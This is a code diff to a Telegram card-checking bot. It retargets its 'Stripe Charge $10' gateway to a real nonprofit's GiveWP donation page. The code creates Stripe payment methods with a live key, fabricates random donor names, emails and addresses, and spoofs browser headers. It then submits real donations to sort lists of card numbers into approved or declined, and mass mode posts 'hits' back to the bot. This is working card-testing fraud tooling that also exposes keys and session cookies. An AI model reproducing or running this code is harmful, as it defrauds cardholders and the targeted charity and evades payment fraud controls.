@@ -149,12 +149,33 @@ STRIPE_SITES = [
     "https://deveneys.ie"
 ]
 
-# Stripe Charge configuration
-SC_STRIPE_PK = "pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq"
-SC_COOKIES = "PHPSESSID=gk3hon1o2cevcq68frr473aqeh; X-Magento-Vary=1f62c8352e88c8b48b0f3c3c248d16c7dfafdeeb10e393475420db9df175a2fe; _pk_ref.6.9cad=%5B%22%22%2C%22%22%2C1774534974%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.6.9cad=ea5beb8f9916f16c.1774534974.; _pk_ses.6.9cad=1; _pk_ref.9.9cad=%5B%22%22%2C%22%22%2C1774534974%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.9.9cad=ae3ee8a948e4e3ae.1774534974.; _pk_ses.9.9cad=1; STUID=329c380b-8d31-b4eb-7c03-6927fef39ea9; STVID=3ea98872-73ca-7255-7359-a25ce1f53694; _ALGOLIA=anonymous-da5f0574-0ac1-4151-b257-21fcf12a851c; form_key=ay1R92X0rV5sYabB; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; __stripe_mid=c0b7bddc-ec46-4761-8fab-f25617de6e5099c075; __stripe_sid=3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1; _ga=GA1.1.765664538.1774534977; cookie_consent=%7B%22groups%22%3A%5B%22necessary%22%2C%22marketing%22%2C%22analytics%22%5D%2C%22rejected%22%3A%5B%5D%2C%22date%22%3A1774534977639%7D; wp_ga4_customerGroup=NOT%20LOGGED%20IN; _gcl_au=1.1.452242132.1774534983; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=%5B%7B%22type%22%3A%22success%22%2C%22text%22%3A%22%5CnYou%20added%20Manner%20digital%20gift%20voucher%20-%20email%20delivery%20to%20your%20%3Ca%20href%3D%5C%22https%3A%5C%2F%5C%2Fshop.manner.com%5C%2Fman_int%5C%2Fcheckout%5C%2Fcart%5C%2F%5C%22%3Eshopping%20cart%3C%5C%2Fa%3E.%22%7D%5D; amzn-checkout-session={}; _ga_QK5V5KEW9J=GS2.1.s1774534977$o1$g1$t1774535093$j36$l0$h0; private_content_version=78674ee4873e001f2c3d0c79d462c30f; section_data_ids={%22cart%22:1774535142%2C%22directory-data%22:1774535066%2C%22wp_ga4%22:1774535142%2C%22messages%22:1774535142%2C%22captcha%22:1774535142}; _ga_9GBVNR2THC=GS2.1.s1774534977$o1$g1$t1774535142$j60$l0$h1143946914"
-SC_CART_ID = "7KF6aKF4nYnlxCdFDS86kPsKyqbTQfuk"
-SC_MERCHANT_URL = "https://shop.manner.com"
+# Stripe Charge $10 configuration (GiveWP + Stripe Elements)
+SC_SITE_URL = "https://ashevillecreativearts.org"
+SC_DONATION_PAGE = f"{SC_SITE_URL}/get-involved/donate-to-our-partner-organizations/donate-to-cine-casual/"
+SC_AJAX_URL = f"{SC_SITE_URL}/wp-admin/admin-ajax.php"
+SC_STRIPE_PK = "pk_live_SMtnnvlq4TpJelMdklNha8iD"
+SC_STRIPE_ACCT = "acct_1H46cvJLC1CnQZhf"
+SC_FORM_ID = "2976"
+SC_FORM_TITLE = "Donate Form - Cine Casual"
+SC_DONATE_AMOUNT = "10.00"
+SC_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
+                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
+                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
+SC_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
+SC_ADDRESSES = [
+    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001"},
+    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005"},
+    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704"},
+    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001"},
+    {"line1": "456 OAK AVE", "city": "CHICAGO", "state": "IL", "zip": "60601"},
+    {"line1": "789 PINE RD", "city": "HOUSTON", "state": "TX", "zip": "77001"},
+    {"line1": "321 ELM ST", "city": "PHOENIX", "state": "AZ", "zip": "85001"},
+    {"line1": "654 MAPLE DR", "city": "MIAMI", "state": "FL", "zip": "33101"},
+]
 sc_mass_running = False
+sc_form_hash = None
+sc_http_session = None
 
 # ============================================
 # COUNTRY FLAGS
@@ -681,138 +702,296 @@ def get_stripe_hits():
 # STRIPE CHARGE GATEWAY
 # ============================================
 
-def sc_create_payment_method(card_number, exp_month, exp_year, cvc):
-    url = "https://api.stripe.com/v1/payment_methods"
-    billing_details = {
-        "billing_details[address][state]": "CA",
-        "billing_details[address][postal_code]": "10080",
-        "billing_details[address][country]": "US",
-        "billing_details[address][city]": "chicago",
-        "billing_details[address][line1]": "camac street, camac street",
-        "billing_details[address][line2]": "",
-        "billing_details[email]": "crimsonkelcie@dollicons.com",
-        "billing_details[name]": "david wyen",
-        "billing_details[phone]": "2018379272",
+def sc_fetch_form_nonce(session):
+    """Get fresh GiveWP form hash via AJAX nonce reset"""
+    try:
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": SC_SITE_URL,
+            "Referer": SC_DONATION_PAGE,
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+        }
+        data = {
+            "action": "give_donation_form_reset_all_nonce",
+            "give_form_id": SC_FORM_ID,
+        }
+        r = session.post(SC_AJAX_URL, headers=headers, data=data, timeout=30, verify=False)
+        if r.status_code == 200:
+            resp = r.json()
+            if resp.get("success"):
+                return resp.get("data", {}).get("give_form_hash", "")
+    except:
+        pass
+    return ""
+
+def sc_create_payment_method(card_number, exp_month, exp_year, cvc, name, email, addr):
+    """Create Stripe payment method via Elements API"""
+    session_id = str(uuid.uuid4())
+    time_on_page = random.randint(15000, 60000)
+    
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
     }
-    card_details = {
+    
+    data = {
         "type": "card",
+        "billing_details[name]": name,
+        "billing_details[email]": email,
+        "billing_details[address][line1]": addr["line1"],
+        "billing_details[address][line2]": "",
+        "billing_details[address][city]": addr["city"],
+        "billing_details[address][state]": addr["state"],
+        "billing_details[address][postal_code]": addr["zip"],
+        "billing_details[address][country]": "US",
         "card[number]": card_number,
         "card[cvc]": cvc,
-        "card[exp_year]": exp_year,
         "card[exp_month]": exp_month,
-        "card[networks][preferred]": "visa",
-        "allow_redisplay": "unspecified",
-    }
-    metadata = {
-        "payment_user_agent": "stripe.js/34f0acd152; stripe-js-v3/34f0acd152; payment-element; deferred-intent; autopm",
-        "referrer": SC_MERCHANT_URL,
-        "time_on_page": "81542",
-        "client_attribution_metadata[client_session_id]": "56bc9fdd-571a-4524-b12e-8e31054460c1",
+        "card[exp_year]": exp_year,
+        "guid": "NA",
+        "muid": "NA",
+        "sid": "NA",
+        "payment_user_agent": "stripe.js/332636417d; stripe-js-v3/332636417d; card-element",
+        "referrer": SC_SITE_URL,
+        "time_on_page": str(time_on_page),
+        "client_attribution_metadata[client_session_id]": session_id,
         "client_attribution_metadata[merchant_integration_source]": "elements",
-        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
-        "client_attribution_metadata[merchant_integration_version]": "2021",
-        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
-        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
-        "client_attribution_metadata[elements_session_id]": "elements_session_1RmfY7HFnW1",
-        "client_attribution_metadata[elements_session_config_id]": "e5e55c55-cf30-4a8a-9922-a91a4bda1166",
-        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
-        "guid": "9923e39b-c3e0-4a52-9538-5029dd8914e6776df0",
-        "muid": "c0b7bddc-ec46-4761-8fab-f25617de6e5099c075",
-        "sid": "3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1",
+        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
+        "client_attribution_metadata[merchant_integration_version]": "2017",
         "key": SC_STRIPE_PK,
-        "_stripe_version": "2025-08-27.basil",
+        "_stripe_account": SC_STRIPE_ACCT,
     }
-    payload = {**billing_details, **card_details, **metadata}
-    headers = {
-        "authority": "api.stripe.com",
-        "accept": "application/json",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://js.stripe.com",
-        "referer": "https://js.stripe.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    }
-    return requests.post(url, data=payload, headers=headers)
+    
+    try:
+        r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=30)
+        return r.status_code, r.json()
+    except Exception as e:
+        return 0, {"error": {"message": str(e), "type": "connection_error"}}
 
-def sc_send_payment(pm_id):
-    url = f"{SC_MERCHANT_URL}/man_int/rest/man_int/V1/guest-carts/{SC_CART_ID}/payment-information"
-    payload = {
-        "cartId": SC_CART_ID,
-        "billingAddress": {
-            "countryId": "US", "regionId": "12", "regionCode": "CA",
-            "region": "California",
-            "street": ["camac street, camac street", "", ""],
-            "company": "", "telephone": "2018379272",
-            "postcode": "10080", "city": "chicago",
-            "firstname": "david", "lastname": "wyen",
-            "vatId": "", "saveInAddressBook": 1
-        },
-        "paymentMethod": {
-            "method": "stripe_payments",
-            "additional_data": {"payment_method": pm_id},
-            "extension_attributes": {"agreement_ids": ["3", "4", "3", "4"]}
-        },
-        "email": "crimsonkelcie@dollicons.com"
-    }
+def sc_submit_donation(session, payment_method_id, form_hash, name, email, addr):
+    """Submit donation to GiveWP page (real charge)"""
+    first, last = name.split(" ", 1) if " " in name else (name, "")
+    submit_url = f"{SC_DONATION_PAGE}?payment-mode=stripe&form-id={SC_FORM_ID}"
+    
     headers = {
-        "authority": "shop.manner.com",
-        "accept": "*/*",
-        "content-type": "application/json",
-        "cookie": SC_COOKIES,
-        "origin": SC_MERCHANT_URL,
-        "referer": f"{SC_MERCHANT_URL}/man_int/checkout/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-        "x-requested-with": "XMLHttpRequest"
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": SC_SITE_URL,
+        "Referer": SC_DONATION_PAGE,
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
     }
-    return requests.post(url, json=payload, headers=headers)
+    
+    data = {
+        "give-honeypot": "",
+        "give-form-id-prefix": f"{SC_FORM_ID}-1",
+        "give-form-id": SC_FORM_ID,
+        "give-form-title": SC_FORM_TITLE,
+        "give-current-url": SC_DONATION_PAGE,
+        "give-form-url": SC_DONATION_PAGE,
+        "give-form-minimum": "5.00",
+        "give-form-maximum": "999999.99",
+        "give-form-hash": form_hash,
+        "give-price-id": "0",
+        "give-recurring-logged-in-only": "",
+        "give-logged-in-only": "1",
+        "_give_is_donation_recurring": "0",
+        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+        "give-amount": SC_DONATE_AMOUNT,
+        "give_stripe_payment_method": payment_method_id,
+        "payment-mode": "stripe",
+        "give_first": first,
+        "give_last": last,
+        "give_company_option": "no",
+        "give_company_name": "",
+        "give_email": email,
+        "give_comment": "",
+        "billing_country": "US",
+        "card_address": addr["line1"],
+        "card_address_2": "",
+        "card_city": addr["city"],
+        "card_state": addr["state"],
+        "card_zip": addr["zip"],
+        "give_action": "purchase",
+        "give-gateway": "stripe",
+    }
+    
+    try:
+        r = session.post(submit_url, headers=headers, data=data,
+                        timeout=60, verify=False, allow_redirects=True)
+        return r.status_code, r.text, r.url
+    except Exception as e:
+        return 0, str(e), ""
 
-def check_stripe_charge(cc, month, year, cvv):
+def sc_classify_error_text(error_msg):
+    """Classify based on plain text error message"""
+    msg_lower = error_msg.lower()
+    if "declined" in msg_lower:
+        return "DECLINED"
+    elif "insufficient" in msg_lower:
+        return "FUNDS"
+    elif "do_not_honor" in msg_lower:
+        return "FUNDS"
+    elif "incorrect_cvc" in msg_lower or "incorrect cvc" in msg_lower:
+        return "CVV"
+    elif "authentication" in msg_lower or "3d" in msg_lower:
+        return "3DS"
+    elif "expired" in msg_lower:
+        return "DECLINED"
+    elif "fraud" in msg_lower:
+        return "DECLINED"
+    elif "lost" in msg_lower or "stolen" in msg_lower:
+        return "FUNDS"
+    elif "restricted" in msg_lower:
+        return "FUNDS"
+    return "DECLINED"
+
+def sc_classify_donation_response(status_code, resp_text, final_url=""):
+    """Classify GiveWP donation response from HTML page"""
+    # Step 1: Extract GiveWP error block
+    error_block = re.search(r'class=["\']give_errors?["\'][^>]*>(.*?)</div>', resp_text, re.DOTALL | re.IGNORECASE)
+    if error_block:
+        error_html = error_block.group(1)
+        error_plain = re.sub(r'<[^>]+>', '', error_html).strip()
+        error_plain = re.sub(r'^Error:\s*', '', error_plain, flags=re.IGNORECASE).strip()
+        if error_plain:
+            cat = sc_classify_error_text(error_plain)
+            return cat, error_plain, error_plain, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 2: Convert HTML to plain text and search
+    plain_text = re.sub(r'<script[^>]*>.*?</script>', '', resp_text, flags=re.DOTALL | re.IGNORECASE)
+    plain_text = re.sub(r'<style[^>]*>.*?</style>', '', plain_text, flags=re.DOTALL | re.IGNORECASE)
+    plain_text = re.sub(r'<[^>]+>', ' ', plain_text)
+    plain_text = re.sub(r'\s+', ' ', plain_text).strip()
+    plain_lower = plain_text.lower()
+    
+    error_match = re.search(r'error:?\s*(there was an issue[^.]*\.)', plain_lower)
+    if error_match:
+        err = error_match.group(1).strip()
+        cat = sc_classify_error_text(err)
+        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    txn_match = re.search(r'(there was an issue with your donation[^.]*\.)', plain_lower)
+    if txn_match:
+        err = txn_match.group(1).strip()
+        cat = sc_classify_error_text(err)
+        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 3: Check raw text for Stripe decline codes
+    resp_lower = resp_text.lower()
+    if "card was declined" in resp_lower or "card_declined" in resp_lower:
+        return "DECLINED", "Your card was declined", "Your card was declined", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "insufficient_funds" in resp_lower or "insufficient funds" in resp_lower:
+        return "FUNDS", "Insufficient funds", "Insufficient funds", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "do_not_honor" in resp_lower:
+        return "FUNDS", "do_not_honor", "do_not_honor", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "generic_decline" in resp_lower:
+        return "FUNDS", "generic_decline", "generic_decline", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "incorrect_cvc" in resp_lower:
+        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "expired_card" in resp_lower:
+        return "DECLINED", "Expired card", "Expired card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "authentication_required" in resp_lower or "3d_secure" in resp_lower:
+        return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "requires_action" in resp_lower:
+        return "DECLINED", "Requires action (3DS)", "Requires action (3DS)", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    elif "lost_card" in resp_lower or "stolen_card" in resp_lower:
+        return "FUNDS", "Lost/Stolen card", "Lost/Stolen card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    # Step 4: Check for success (thank you page)
+    thank_match = re.search(r'thank\s*you\s*(for\s*your\s*donation|for\s*donating)', plain_lower)
+    if thank_match:
+        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    if "donation-confirmation" in final_url.lower() or "success" in final_url.lower():
+        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    
+    return "DECLINED", plain_text[:150] if plain_text else "Unknown", plain_text[:150] if plain_text else "Unknown", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+
+def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
+    """Check card via GiveWP Stripe Charge $10 gateway"""
+    global sc_form_hash, sc_http_session
     start_time = time.time()
     if len(year) == 2:
         year = f"20{year}"
+    
+    # Generate random identity
+    first = random.choice(SC_FIRST_NAMES)
+    last = random.choice(SC_LAST_NAMES)
+    name = f"{first} {last}"
+    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
+    email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
+    email = f"{email_user}@{random.choice(domains)}"
+    addr = random.choice(SC_ADDRESSES)
+    
     try:
-        stripe_resp = sc_create_payment_method(cc, month, year, cvv)
-        elapsed = round(time.time() - start_time, 2)
-        if stripe_resp.status_code != 200:
-            try:
-                err_data = stripe_resp.json().get("error", {})
-                err_msg = err_data.get("message", f"Stripe error {stripe_resp.status_code}")
-                err_code = err_data.get("code", "")
-                category, _ = classify_response(f"{err_code} {err_msg}")
-                return category, err_msg, err_msg, "N/A", "Stripe Charge", elapsed
-            except:
-                return "DECLINED", f"Stripe error {stripe_resp.status_code}", f"Stripe error {stripe_resp.status_code}", "N/A", "Stripe Charge", elapsed
-        
-        stripe_data = stripe_resp.json()
-        pm_id = stripe_data.get("id")
-        if not pm_id:
-            return "DECLINED", "No payment method ID", "No payment method ID", "N/A", "Stripe Charge", elapsed
-        
-        merchant_resp = sc_send_payment(pm_id)
+        # Step 1: Create Stripe payment method
+        pm_status, pm_resp = sc_create_payment_method(cc, month, year, cvv, name, email, addr)
         elapsed = round(time.time() - start_time, 2)
         
-        if merchant_resp.status_code == 200:
-            try:
-                resp_json = merchant_resp.json()
-                if resp_json.get("success") is False:
-                    msg = resp_json.get("message", "Merchant failed")
-                    category, _ = classify_response(msg)
-                    return category, msg, msg, "CHARGED", "Stripe Charge", elapsed
-            except:
-                pass
-            return "CHARGE", "Payment Successful", "Payment Successful", "CHARGED", "Stripe Charge", elapsed
-        else:
-            try:
-                err_msg = merchant_resp.json().get("message", f"Merchant error {merchant_resp.status_code}")
-            except:
-                err_msg = f"Merchant error {merchant_resp.status_code}"
-            category, _ = classify_response(err_msg)
-            return category, err_msg, err_msg, "N/A", "Stripe Charge", elapsed
+        if pm_status != 200 or "id" not in pm_resp:
+            # Payment method creation failed - classify from Stripe error
+            if "error" in pm_resp:
+                error = pm_resp["error"]
+                code = error.get("code", "")
+                decline_code = error.get("decline_code", "")
+                message = error.get("message", "Unknown error")
+                
+                if code == "card_declined":
+                    if decline_code in ("insufficient_funds", "generic_decline", "do_not_honor",
+                                       "transaction_not_allowed", "pickup_card", "restricted_card",
+                                       "lost_card", "stolen_card", "not_permitted"):
+                        return "FUNDS", f"CVV MATCH - {decline_code}", f"CVV MATCH - {decline_code}", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                    elif decline_code == "live_mode_test_card":
+                        return "DECLINED", "Test card in live mode", "Test card in live mode", "N/A", "Stripe Charge $10", elapsed
+                    elif decline_code == "incorrect_cvc":
+                        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                    elif decline_code == "expired_card":
+                        return "DECLINED", "Expired card", "Expired card", "N/A", "Stripe Charge $10", elapsed
+                    elif decline_code == "fraudulent":
+                        return "DECLINED", "Fraudulent", "Fraudulent", "N/A", "Stripe Charge $10", elapsed
+                    else:
+                        return "DECLINED", f"{decline_code} - {message}", f"{decline_code} - {message}", "N/A", "Stripe Charge $10", elapsed
+                elif code == "incorrect_number" or code == "invalid_number":
+                    return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
+                elif code == "incorrect_cvc":
+                    return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                elif code == "authentication_required":
+                    return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
+                elif code in ("card_velocity_exceeded", "rate_limit"):
+                    return "ERROR", "Rate limited", "Rate limited", "N/A", "Stripe Charge $10", elapsed
+                return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
+            return "DECLINED", f"Stripe error {pm_status}", f"Stripe error {pm_status}", "N/A", "Stripe Charge $10", elapsed
+        
+        pm_id = pm_resp.get("id")
+        
+        # Step 2: Submit donation to GiveWP
+        if session is None:
+            if sc_http_session is None:
+                sc_http_session = requests.Session()
+                sc_http_session.headers.update({
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+                })
+            session = sc_http_session
+        
+        if form_hash is None:
+            if sc_form_hash is None:
+                sc_form_hash = sc_fetch_form_nonce(session)
+            form_hash = sc_form_hash
+        
+        don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
+        elapsed = round(time.time() - start_time, 2)
+        
+        category, status_msg, response_msg, price, gateway = sc_classify_donation_response(don_status, don_resp, final_url)
+        return category, status_msg, response_msg, price, gateway, elapsed
+        
     except requests.exceptions.Timeout:
         elapsed = round(time.time() - start_time, 2)
-        return "ERROR", "Timeout", "Request timed out", "N/A", "Stripe Charge", elapsed
+        return "ERROR", "Timeout", "Request timed out", "N/A", "Stripe Charge $10", elapsed
     except Exception as e:
         elapsed = round(time.time() - start_time, 2)
-        return "ERROR", str(e)[:80], str(e)[:80], "N/A", "Stripe Charge", elapsed
+        return "ERROR", str(e)[:80], str(e)[:80], "N/A", "Stripe Charge $10", elapsed
 
 # ============================================
 # STRIPE CHARGE CARD MANAGEMENT
@@ -1881,7 +2060,7 @@ def format_sc_response(card_data, category, status_msg, response_msg, price, gat
     
     message = f"{title}\n\n"
     message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
-    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Charge')}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Charge $10')}\n"
     message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
     message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
     
@@ -1968,7 +2147,7 @@ def get_main_keyboard():
         InlineKeyboardButton("🔓 AU MASS", callback_data="stripe_mass"),
         InlineKeyboardButton("🔓 AU HITS", callback_data="stripe_hits")
     )
-    # ── Row 3: Stripe Charge ──
+    # ── Row 3: Stripe Charge $10 ──
     keyboard.row(
         InlineKeyboardButton("💳 SC CHK", callback_data="sc_check"),
         InlineKeyboardButton("💳 SC MASS", callback_data="sc_mass"),
@@ -2105,7 +2284,7 @@ def handle_document(message):
         markup.add(
             InlineKeyboardButton("🛒 Shopify", callback_data="file_gw_shopify"),
             InlineKeyboardButton("🔓 Stripe Auth (FREE)", callback_data="file_gw_stripe_auth"),
-            InlineKeyboardButton("💳 Stripe Charge", callback_data="file_gw_stripe_charge"),
+            InlineKeyboardButton("💳 Stripe Charge $10", callback_data="file_gw_stripe_charge"),
             InlineKeyboardButton("📦 ALL GATEWAYS", callback_data="file_gw_all")
         )
         
@@ -2190,7 +2369,7 @@ def send_welcome(message):
     welcome_text = f"""
 ╔══════════════════════════════╗
    🤖 *{BOT_NAME} {BOT_VERSION}*
-   ⚡ Shopify + Stripe Auth + Stripe Charge
+   ⚡ Shopify + Stripe Auth + Stripe Charge $10
 ╚══════════════════════════════╝
 
 🛒 *━━ SHOPIFY GATEWAY ━━*
@@ -2201,7 +2380,7 @@ def send_welcome(message):
   /au `cc|mm|yy|cvv` ─ Single check
   /mau ─ Mass check (pipeline)
 
-💳 *━━ STRIPE CHARGE ━━*
+💳 *━━ STRIPE CHARGE $10 ━━*
   /sc `cc|mm|yy|cvv` ─ Single check
   /msc ─ Mass check (pipeline)
 
@@ -2212,7 +2391,7 @@ def send_welcome(message):
   /delproxy ─ Delete proxy
   /clearshopify ─ Clear Shopify cards
   /clearau ─ Clear Stripe Auth cards
-  /clearsc ─ Clear Stripe Charge cards
+  /clearsc ─ Clear Stripe Charge $10 cards
 
 ⚙️ *━━ SETTINGS ━━*
   /stats ─ Statistics
@@ -2327,7 +2506,7 @@ def sc_command(message):
         bot.reply_to(message, "❌ Invalid card number")
         return
     
-    processing_msg = bot.reply_to(message, "💳 *Checking with Stripe Charge Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
+    processing_msg = bot.reply_to(message, "💳 *Checking with Stripe Charge $10 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
     
     bin_info = bin_lookup(cc[:6])
     category, status_msg, response_msg, price, gateway, elapsed = check_stripe_charge(cc, month, year, cvv)
@@ -2364,7 +2543,7 @@ def sc_mass_command(message):
     
     cards = get_all_sc_cards()
     if not cards:
-        bot.reply_to(message, "❌ No Stripe Charge cards saved. Send a .txt file (name with 'charge' or 'sc').")
+        bot.reply_to(message, "❌ No Stripe Charge $10 cards saved. Send a .txt file (name with 'charge' or 'sc').")
         return
     
     total = len(cards)
@@ -2385,7 +2564,7 @@ def sc_mass_command(message):
     progress_bar = create_progress_bar(0, total)
     msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ *STRIPE CHARGE MASS CHECK (1x)*
+⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*
 
 `{progress_bar}`
 ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
@@ -2410,7 +2589,14 @@ def sc_mass_command(message):
             stop_mass_flag = False
     
     def _run_sc_mass_inner(chat_id, msg_id):
-        global sc_mass_running, stop_mass_flag
+        global sc_mass_running, stop_mass_flag, sc_form_hash, sc_http_session
+        
+        # Pre-fetch GiveWP form nonce for mass check
+        sc_http_session = requests.Session()
+        sc_http_session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        })
+        sc_form_hash = sc_fetch_form_nonce(sc_http_session)
         
         stats = {
             'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
@@ -2472,7 +2658,7 @@ def sc_mass_command(message):
                 progress_bar = create_progress_bar(completed, total)
                 update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ *STRIPE CHARGE MASS CHECK (1x)*
+⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*
 
 `{progress_bar}`
 ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
@@ -2530,7 +2716,7 @@ def sc_mass_command(message):
                             stats['funds'] += 1
                         
                         icon, cat_display, dot = get_status_emoji(category)
-                        hit_msg = f"""{dot} *STRIPE CHARGE ─ APPROVED* {dot}
+                        hit_msg = f"""{dot} *STRIPE CHARGE $10 ─ APPROVED* {dot}
 {LINE_THIN}
 💳 `{cc}|{month}|{year}|{cvv}`
 🌐 {gateway}
@@ -2621,9 +2807,9 @@ def sc_mass_command(message):
 def sc_hits_command(message):
     hits = get_sc_hits()
     if not hits:
-        bot.reply_to(message, "❌ No Stripe Charge hits yet")
+        bot.reply_to(message, "❌ No Stripe Charge $10 hits yet")
         return
-    response = f"💳 *{BOT_NAME} ─ STRIPE CHARGE HITS ({len(hits)})*\n{LINE_DASH}\n\n"
+    response = f"💳 *{BOT_NAME} ─ STRIPE CHARGE $10 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
     for i, hit in enumerate(hits[-20:], 1):
         cc = hit.get('cc', '?')
         month = hit.get('month', '?')
@@ -3939,7 +4125,7 @@ Please wait while workers finish...""",
             
             if gw_choice == "all":
                 gateways = ["shopify", "stripe_auth", "stripe_charge"]
-                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge"]
+                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge $10"]
             elif gw_choice == "shopify":
                 gateways = ["shopify"]
                 gw_names = ["🛒 Shopify"]
@@ -3948,7 +4134,7 @@ Please wait while workers finish...""",
                 gw_names = ["🔓 Stripe Auth"]
             elif gw_choice == "stripe_charge":
                 gateways = ["stripe_charge"]
-                gw_names = ["💳 Stripe Charge"]
+                gw_names = ["💳 Stripe Charge $10"]
             else:
                 gateways = []
                 gw_names = []
@@ -3970,7 +4156,7 @@ Please wait while workers finish...""",
             response += f"\n{LINE_THIN}\n📊 *Queues:*\n"
